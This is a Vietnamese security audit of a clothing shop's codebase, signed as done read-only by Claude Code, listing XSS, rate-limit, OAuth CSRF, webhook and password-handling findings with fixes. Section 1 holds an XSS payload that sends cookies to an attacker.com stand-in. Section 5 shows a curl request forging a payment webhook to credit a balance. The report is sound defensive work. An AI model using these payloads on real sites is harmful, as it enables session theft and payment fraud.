# Security & Code Quality Audit — QH Clothes (qhboypho)

> Ngày kiểm tra: 2026-05-21  
> Phạm vi: Toàn bộ codebase — login, thanh toán, frontend UI, logic nghiệp vụ

---

## Tổng quan nhanh

| Hạng mục | Trạng thái | Ghi chú |
|---|---|---|
| SQL Injection | ✅ Tốt | Tất cả query dùng parameterized bindings |
| Admin Auth | ✅ Tốt | PBKDF2 + secure token, HttpOnly cookie |
| User Auth | ✅ Tốt | Signed cookie qua hono/cookie |
| Payment Webhook | ✅ Tốt | HMAC-SHA256 verify trước khi xử lý |
| XSS — server HTML | ✅ Tốt | Hono JSX tự escape; admin pages an toàn |
| XSS — client innerHTML | ❌ Cần sửa | Nhiều chỗ inject `p.name`, `item.name` trực tiếp |
| Bảo vệ `innerHTML` cart | ⚠️ Một phần | `escapeHtml` có dùng nhưng không nhất quán |
| CORS | ✅ Tốt | Whitelist-based, không mở wildcard mặc định |
| Spam / Anti-fraud | ✅ Tốt | Daily order limit, auto-block, IP hash, device hash |
| Password brute-force | ❌ Thiếu | Không có rate-limit hoặc lockout trên login |
| Timing-safe compare | ⚠️ Yếu | `===` thay vì constant-time compare cho session token |
| Google OAuth state param | ❌ Thiếu | Không có CSRF state parameter |
| Casso webhook token | ⚠️ Có điều kiện | Bỏ qua verify nếu `CASSO_SECURE_TOKEN` không set |

---

## 1. XSS — `innerHTML` không escape product data (HIGH)

**Files:** `src/pages/storefront/script.ts`, `src/pages/storefront/script-detail-order.ts`

### Vấn đề

Hàm `escapeHtml()` đã có nhưng không được dùng nhất quán. Các trường lấy từ API (do admin nhập) bị inject thẳng vào `innerHTML`:

```js
// script.ts — bestseller card
`<p class="bs-name mb-1.5">${p.name}</p>`            // dòng ~1011

// script.ts — product grid card
`<h3 class="...">${p.name}</h3>`                      // dòng ~1228

// script.ts — cart item list
+ '<p class="...">' + item.name + '</p>'              // dòng 1567
+ '<p class="...">' + item.sku  + '</p>'              // dòng 1568

// script.ts — checkout summary
+ '<p class="...">' + i.name + '</p>'                 // dòng 1726

// script.ts — address dropdown (item từ API địa chỉ)
'<button ...>' + item.name + '</button>'              // dòng 503

// script-detail-order.ts — detail modal
alt="${p.name}"                                       // dòng 31
<h2 ...>${p.name}</h2>                               // dòng 44
<p ...>${p.brand}</p>                                // dòng 43
<p ...>${p.description}</p>                          // dòng 50
<span ...>${item.name}</span>                        // dòng 65
```

**So sánh — các chỗ đã đúng (đã dùng escapeHtml):**
- Hero carousel: `escapeHtml(b.title)`, `escapeHtml(b.image_url)`, v.v.
- Review section: `escapeHtml(r.user_name)`, `escapeHtml(r.comment)`
- Brand tag mới thêm: `escapeHtml(brand)` — dòng 1200
- Cart variant selector mới: `escapeHtml(variantLabel)` — dòng 1569

### Kịch bản khai thác

Admin đặt tên sản phẩm thành:
```
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
```

→ Mọi khách hàng mở trang → JS thực thi trong session của họ.  
→ Payload lưu vào `localStorage` (cart) → tiếp tục khai thác dù admin đã sửa lại tên sản phẩm.

> **Lưu ý:** Đây là *admin-controlled XSS*, không phải XSS từ người dùng ẩn danh. Trong mô hình một cửa hàng nhỏ, rủi ro thực tế thấp hơn — nhưng nếu tài khoản admin bị chiếm, toàn bộ khách hàng bị ảnh hưởng.

### Fix

```js
`<p class="bs-name">${escapeHtml(p.name)}</p>`
`<h3 class="...">${escapeHtml(p.name)}</h3>`
+ '<p class="...">' + escapeHtml(item.name) + '</p>'
+ '<p class="...">' + escapeHtml(item.sku)  + '</p>'
+ '<p class="...">' + escapeHtml(i.name)    + '</p>'
'<button ...>' + escapeHtml(item.name) + '</button>'
// script-detail-order.ts: wrap tất cả p.name, p.brand, p.description, item.name bằng escapeHtml()
```

---

## 2. Admin Login — Không có rate-limit / lockout (MEDIUM)

**File:** `src/routes/authRoutes.ts` — `/api/admin/login`

### Vấn đề

Endpoint đăng nhập admin không có bất kỳ giới hạn số lần thử nào:

```ts
app.post('/api/admin/login', async (c) => {
  // Không có IP tracking, không có attempt counter, không có lockout
  const isMatch = await verifyPassword(password, expectedPassword)
  if (!isMatch) return c.json({ success: false, error: 'Invalid credentials' }, 401)
  ...
})
```

Mật khẩu mặc định là `admin` (khi chưa đổi). Kẻ tấn công có thể brute-force không bị chặn.

**Tương tự** tại `/api/auth/login` (user login) — cũng không có rate-limit.

### Fix

Cloudflare Workers không có in-memory state, dùng D1 để đếm attempt:
```sql
-- Tạo bảng login_attempts (ip_hash, admin_key, attempt_count, window_start)
```
Hoặc đơn giản hơn: dùng Cloudflare WAF rate-limiting rule ở tầng edge cho path `/api/admin/login`.

---

## 3. Google OAuth — Thiếu CSRF state parameter (MEDIUM)

**File:** `src/routes/authRoutes.ts` — `/api/auth/google` và `/api/auth/callback`

### Vấn đề

OAuth flow không generate và verify `state` parameter:

```ts
// /api/auth/google — không set state
const url = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${clientId}&redirect_uri=...`
return c.redirect(url)

// /api/auth/callback — không verify state
const code = c.req.query('code')
// trực tiếp dùng code mà không check state
```

Thiếu `state` mở ra **OAuth CSRF attack**: kẻ tấn công có thể khiến nạn nhân đăng nhập vào tài khoản Google của *kẻ tấn công*, sau đó nạn nhân thao tác (đặt hàng, nhập địa chỉ) trên account đó.

### Fix

```ts
// /api/auth/google
const state = generateSecureToken(16)
setCookie(c, 'oauth_state', state, { httpOnly: true, sameSite: 'Lax', maxAge: 300 })
const url = `...&state=${state}`

// /api/auth/callback
const cookieState = getCookie(c, 'oauth_state')
const queryState  = c.req.query('state')
if (!cookieState || cookieState !== queryState) return c.redirect('/?login=error&step=state_mismatch')
deleteCookie(c, 'oauth_state')
```

---

## 4. Admin Session Token — Không dùng timing-safe compare (LOW)

**File:** `src/lib/adminHelpers.ts` — `validateAdminSessionToken()`

### Vấn đề

```ts
return !!row && row.value === token   // so sánh string thông thường
```

So sánh `===` trong JavaScript có thể bị timing attack: CPU dừng so sánh ngay khi gặp ký tự khác, tiết lộ thông tin về độ dài prefix khớp.

Trong môi trường Cloudflare Workers (network latency cao, multi-tenant), timing attack thực tế rất khó khai thác. Tuy nhiên đây là bad practice cho security-critical comparison.

### Fix

```ts
import { timingSafeEqual } from 'crypto'  // Node crypto — không available trong CF Workers

// CF Workers alternative: dùng HMAC compare
async function timingSafeStringEqual(a: string, b: string): Promise<boolean> {
  const encoder = new TextEncoder()
  const aBytes = encoder.encode(a)
  const bBytes = encoder.encode(b)
  if (aBytes.length !== bBytes.length) return false
  const key = await crypto.subtle.importKey('raw', crypto.getRandomValues(new Uint8Array(32)), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign'])
  const [sigA, sigB] = await Promise.all([
    crypto.subtle.sign('HMAC', key, aBytes),
    crypto.subtle.sign('HMAC', key, bBytes)
  ])
  // Compare the HMACs (same length, timing-safe via byte comparison)
  const aArr = new Uint8Array(sigA), bArr = new Uint8Array(sigB)
  return aArr.every((v, i) => v === bArr[i])
}
```

---

## 5. Casso Webhook — Bỏ qua verify nếu không cấu hình token (LOW)

**File:** `src/routes/paymentRoutes.ts` — `/api/webhooks/casso`

### Vấn đề

```ts
const secureToken = c.req.header('secure-token')
if (c.env.CASSO_SECURE_TOKEN && secureToken !== c.env.CASSO_SECURE_TOKEN) {
  return c.json({ error: 'Invalid token' }, 401)
}
// Nếu CASSO_SECURE_TOKEN không set → bỏ qua verify → bất kỳ ai cũng có thể gọi
```

Nếu biến môi trường `CASSO_SECURE_TOKEN` chưa được set (dev, staging, hoặc quên cấu hình), webhook này mở toàn bộ: bất kỳ request nào cũng có thể credit balance cho user tùy ý, vì logic đọc `QHVN90{userId}` từ description và `UPDATE users SET balance = balance + ?`.

### Kịch bản khai thác

```bash
curl -X POST https://qhclothes.pages.dev/api/webhooks/casso \
  -H "Content-Type: application/json" \
  -d '{"error":0,"data":[{"tid":"fake123","amount":999999,"description":"QHVN90123 nap tien"}]}'
```

→ User ID 123 nhận 999,999 VNĐ balance (nếu token chưa set).

### Fix

```ts
// Bắt buộc có token — fail nếu không cấu hình
if (!c.env.CASSO_SECURE_TOKEN) {
  return c.json({ error: 'Webhook not configured' }, 503)
}
if (secureToken !== c.env.CASSO_SECURE_TOKEN) {
  return c.json({ error: 'Invalid token' }, 401)
}
```

---

## 6. `verifyPassword` — Fallback plaintext compare (LOW/INFO)

**File:** `src/lib/adminHelpers.ts` — `verifyPassword()`

### Vấn đề

```ts
export async function verifyPassword(password: string, stored: string): Promise<boolean> {
  if (!stored) return false
  if (!stored.startsWith('pbkdf2:')) {
    return password === stored  // So sánh plaintext!
  }
  ...
}
```

Code có comment là "auto-migrate on first login" nhưng nhánh này vẫn tồn tại. Nếu vì lý do nào đó một password được lưu plaintext (ví dụ: seed data, import từ backup cũ), hệ thống sẽ chấp nhận nó mà không cảnh báo.

Cũng áp dụng plaintext compare ở đây — không timing-safe (xem mục 4).

### Fix

```ts
if (!stored.startsWith('pbkdf2:')) {
  // Reject hoàn toàn, không cho phép plaintext login
  console.error('[auth] plaintext password detected for key — force reset required')
  return false
}
```

---

## 7. Google OAuth Callback — Thông tin lỗi DB bị lộ qua URL redirect (LOW/INFO)

**File:** `src/routes/authRoutes.ts` — dòng ~504

### Vấn đề

```ts
return c.redirect('/?login=error&step=db_sync&msg=' + encodeURIComponent(dbErr.message))
```

Message lỗi từ D1/SQLite được đưa thẳng vào URL redirect. Người dùng (hoặc browser history, log proxy) sẽ thấy thông tin nội bộ như tên bảng, constraint name, v.v.

### Fix

```ts
console.error('[auth] db sync error', dbErr)
return c.redirect('/?login=error&step=db_sync&error=DB_SYNC_FAILED')
```

---

## 8. Điều tốt — Những gì đã làm đúng

### Bảo mật backend

- ✅ **Tất cả SQL query đều dùng parameterized bindings** — không có string concatenation trong query
- ✅ **PBKDF2 + salt ngẫu nhiên** cho password admin (50,000 iterations, SHA-256)
- ✅ **Secure token 96 hex chars** cho admin session (`generateSecureToken(48)`)
- ✅ **HttpOnly + SameSite=Lax** cho tất cả auth cookie
- ✅ **HMAC-SHA256 verify** trước khi xử lý PayOS webhook và ZaloPay callback
- ✅ **Xác thực `order_id`** trước khi mark payment — không thể giả mạo paid
- ✅ **CORS whitelist** — không để `*` mặc định
- ✅ **Admin middleware guard** bảo vệ toàn bộ `/api/admin/*`

### Anti-fraud / chống lạm dụng

- ✅ **Giới hạn 2 đơn/ngày** theo phone, IP hash, address fingerprint, device hash
- ✅ **Auto-block** khách hủy ≥ 3 đơn
- ✅ **Chặn theo IP hash** khi đăng ký tài khoản mới
- ✅ **Giới hạn 3 tài khoản** per phone/IP

### Frontend

- ✅ `escapeHtml()` được dùng đúng ở hero carousel, review section, brand tag, cart variant label
- ✅ Address dropdown dùng `textContent` (dòng 316) thay vì `innerHTML` cho option items một số nơi

---

## Tóm tắt ưu tiên sửa

| # | Vấn đề | Mức độ | Effort |
|---|---|---|---|
| 1 | XSS `innerHTML` — `p.name`, `item.name`, `p.description` | HIGH | Thấp — chỉ wrap bằng `escapeHtml()` |
| 2 | Casso webhook không verify token khi chưa cấu hình | HIGH* | Thấp — đổi điều kiện `if` |
| 3 | Admin login không có rate-limit / brute-force protection | MEDIUM | Trung bình — cần CF WAF hoặc D1 counter |
| 4 | Google OAuth thiếu CSRF state parameter | MEDIUM | Trung bình — thêm cookie state |
| 5 | Timing-safe compare cho session token | LOW | Thấp |
| 6 | Plaintext password fallback nên reject thay vì chấp nhận | LOW | Thấp |
| 7 | DB error message lộ qua URL redirect | LOW | Thấp |

> \* Mục 2 trở thành **CRITICAL** nếu `CASSO_SECURE_TOKEN` chưa được set trên production.

---

*Audit thực hiện bởi Claude Code — chỉ đọc code, không thay đổi file nào.*
